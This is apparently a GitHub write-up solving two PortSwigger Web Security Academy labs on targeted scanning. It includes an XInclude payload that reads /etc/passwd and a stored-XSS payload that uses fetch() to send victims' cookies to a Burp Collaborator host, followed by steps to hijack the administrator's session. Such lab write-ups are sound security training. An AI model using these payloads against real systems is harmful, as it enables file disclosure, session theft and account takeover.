## Labs Covered

This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy related to **Essential Skills**:

**Discovering vulnerabilities quickly with targeted scanning**  
This lab demonstrates how to use targeted scanning techniques to identify vulnerabilities more efficiently by focusing on likely problem areas.

**Scanning non-standard data structures**  
This lab shows how to identify and scan non-standard or complex data structures that may not be handled effectively by typical scanning tools.

---

### LAB 1 - Discovering vulnerabilities quickly with targeted scanning

### Lab Description

<img width="866" height="565" alt="image" src="https://github.com/user-attachments/assets/21c297ca-022c-4345-b414-a75edb05f99e" />

### Solution



### **1. Identifying a Suspicious URL**

* Start by browsing the application and identifying any URL or feature that might be parsing XML or making server-side HTTP requests.
* In this lab, you notice `/product/stock` as a vulnerable target.


---

### **2. Run Active Scan**

* Send the scan the request to **Burp Scanner**.
* After the active scan completes, **Burp identifies an Out-of-Band Resource Load** on this endpoint, indicating it may be vulnerable to **XXE or XInclude-based file inclusion**.

<img width="1561" height="699" alt="image" src="https://github.com/user-attachments/assets/0c6a17dd-42cd-44b3-8a31-a853403cfd6a" />

---

### **3. Analyzing the Scanner Finding**

* The scanner reports that it's possible to induce the application to **load external resources**, which hints at insecure XML parsing or XInclude being enabled on the server.

<img width="1789" height="893" alt="image" src="https://github.com/user-attachments/assets/f69d8b9e-69c4-41d9-9028-a1d9aca5428f" />

---

### **4. Send Request to Repeater**

* Forward the same request (from the scanner or proxy) to **Burp Repeater** for manual testing.
* Observe the body parameters — the `productId` parameter is typically the XML input field to focus on.

<img width="1911" height="813" alt="image" src="https://github.com/user-attachments/assets/a14cf920-ae41-4943-8786-01763ac5556a" />

---

### **5. Injecting Malicious Payload**

* Modify the `productId` XML input with an **XInclude payload** to try accessing sensitive files, like `/etc/passwd`.

**Payload:**

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
<img width="774" height="320" alt="image" src="https://github.com/user-attachments/assets/a2974116-682b-4eae-b3f3-f66f9a121ab9" />

<img width="1873" height="779" alt="image" src="https://github.com/user-attachments/assets/90058374-53bf-4809-af7f-07b3e879706f" />


---

### **6. Analyze the Response**

* Send the modified request.
* If the server is vulnerable and XInclude is enabled, the server will **parse the injected file** and return its contents in the HTTP response.
* You should now see the contents of `/etc/passwd` in the response body.

<img width="395" height="494" alt="image" src="https://github.com/user-attachments/assets/fe1d9295-4ea1-42d2-b713-3d56e8ab26cd" />

---

### **Lab Solved** 

You've confirmed that the application is **vulnerable to XInclude-based file inclusion**, and you were able to **read arbitrary files from the server** using a crafted XML payload.






---

### LAB 2 - Scanning non-standard data structures

### Lab Description

<img width="774" height="306" alt="image" src="https://github.com/user-attachments/assets/ecc78d58-0501-4fda-ad07-46b165079ec8" />


### Solution


### **1. Install Required Extensions**

* Install any necessary browser or Burp Suite extensions to assist with testing and decoding (e.g., "HackTools" for payloads or "JSON Viewer").

<img width="1445" height="657" alt="image" src="https://github.com/user-attachments/assets/9811d201-86d8-4966-a506-f9fd68d68d40" />

---

### **2. Login as Wiener**

* Login with the **wiener** user credentials provided in the lab.
<img width="1742" height="772" alt="image" src="https://github.com/user-attachments/assets/c090f6da-c5a8-405e-9999-7d0e590f8910" />

---

### **3. Send Authenticated Request to Repeater**

* After logging in, intercept any request (e.g., to the account page) and **send it to Burp Repeater**.
* This allows you to examine and manipulate the request more easily.

 <img width="907" height="579" alt="image" src="https://github.com/user-attachments/assets/aa938fe2-c346-4f28-bdf4-e1c2e32cf81f" />

---

### **4. Decode the Session Cookie**

* Decode the session cookie using **Base64** decoding or **JWT decoder**, depending on the format.
* You’ll likely see **structured content** with identifiable parameter names.
<img width="919" height="413" alt="image" src="https://github.com/user-attachments/assets/e5fdfc54-a243-44ab-87ce-b715900fe44b" />

---

### **5. Manual Fuzzing**

* Try manually inserting payloads into visible fields like **profile bio**, **username**, or other form inputs.
* In this case, you didn’t find any XSS reflected manually, so you try another method.

<img width="1202" height="665" alt="image" src="https://github.com/user-attachments/assets/7efad56f-0237-410b-ad83-20ca26ad82c3" />

---

### **6. Send to Intruder**

* Send the profile update request to **Burp Intruder**.
* Use **cluster bomb** or **pitchfork** mode with common XSS payloads to find possible injection points.

<img width="979" height="638" alt="image" src="https://github.com/user-attachments/assets/1cdd776e-d9b1-473d-9660-158d2bbfa2c6" />

---

### **7. Scan for XSS Insertion Point**

* Begin **active scanning** or custom payload injection using **Intruder**.
* After analyzing responses, you discover that one parameter reflects content back — **a stored XSS vulnerability is identified**.

<img width="1328" height="771" alt="image" src="https://github.com/user-attachments/assets/bfb23773-05b4-498e-a071-e9b4362b9149" />

Doing Insertion point scan

<img width="1328" height="771" alt="image" src="https://github.com/user-attachments/assets/8714834b-f290-41cf-bf76-ee4b1ae412b8" />

We have find Cross-site scripting store of insertion point

<img width="1886" height="931" alt="image" src="https://github.com/user-attachments/assets/42bb5cdf-aecd-4e80-acfe-31e2e7863dec" />

---

### **8. Craft XSS Payload**

* Send a **basic XSS payload** to Repeater to verify reflection and triggering:
* Once verified, move to building a **data exfiltration payload**.

 <img width="683" height="790" alt="image" src="https://github.com/user-attachments/assets/f5d9d867-aad0-4d3f-955e-28468d9189fd" />

Decoded payload

<img width="1383" height="412" alt="image" src="https://github.com/user-attachments/assets/c1f497b4-ce95-48a6-b0b1-76271967925a" />

---

### **9. Create Payload for Collaborator**

* Craft an XSS payload to steal the session cookie using **Burp Collaborator**:

  ```html
  "><svg/onload=fetch(`//YOUR-COLLABORATOR-ID.burpcollaborator.net?cookie=${encodeURIComponent(document.cookie)}`)>
  ```
* Replace `YOUR-COLLABORATOR-ID` with your actual Burp Collaborator payload URL.

<img width="1911" height="597" alt="image" src="https://github.com/user-attachments/assets/b733228f-1e74-4c03-97bf-a040ac26e94b" />

<img width="1771" height="370" alt="image" src="https://github.com/user-attachments/assets/4cd07f2d-adf0-4fe3-b396-16b6683b4bf4" />

---

### **10. Submit Payload and Wait**

* Submit the above payload in the vulnerable parameter (e.g., bio, message, comment).
* Wait for the **administrator to view the page**, triggering the XSS and sending their cookie to your Burp Collaborator.

---

### **11. Capture Administrator's Cookie**

* In Burp Collaborator client, monitor the DNS or HTTP log.
* You should see a request containing the **administrator’s session cookie**.

<img width="1727" height="810" alt="image" src="https://github.com/user-attachments/assets/15e9a399-759e-4905-ad35-dbaca6650dc3" />

<img width="1219" height="479" alt="image" src="https://github.com/user-attachments/assets/2b61557a-9258-4818-9c98-ca7a336b5c71" />

---

### **12. Decode Administrator’s Cookie**

* Copy the stolen cookie value and **decode it** (if encoded) to inspect its contents.
* This verifies you got the right session.

<img width="1152" height="385" alt="image" src="https://github.com/user-attachments/assets/05c1c0ad-f23f-42ad-b680-39efc04352f0" />



---

### **13. Impersonate Administrator**

* Take the administrator’s session cookie (only the value **before the first semicolon**).
* Replace wiener’s session cookie with this one using **Burp** or **browser dev tools**.
* URL-encode the value and paste it in the `Cookie` header.

<img width="1832" height="724" alt="image" src="https://github.com/user-attachments/assets/59f59ee8-e7c4-409b-a9ac-99a585c9b3a7" />

---

### **14. Reload and Delete Carlos**

* Reload the page.
* You should now be logged in as the **administrator**.
* Go to the **admin panel**, find **Carlos**, and delete his account.

---

###  **Lab Solved**


---
